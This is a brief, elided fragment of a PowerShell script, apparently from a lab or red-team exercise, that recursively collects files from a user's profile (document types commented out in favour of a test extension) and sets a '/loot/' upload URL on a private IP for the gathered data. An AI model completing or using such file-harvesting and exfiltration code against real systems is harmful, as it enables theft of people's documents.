...
# gather all targets 
$targets = gci -Path c:\users\$env:USERNAME  -Recurse -Include *.testfile123 #*.pdf,*.txt,*.doc*,*.ppt*,*.xls*
...
$webServerUrl = "192.168.83.129:8000/loot/$nodename.loot.csv"
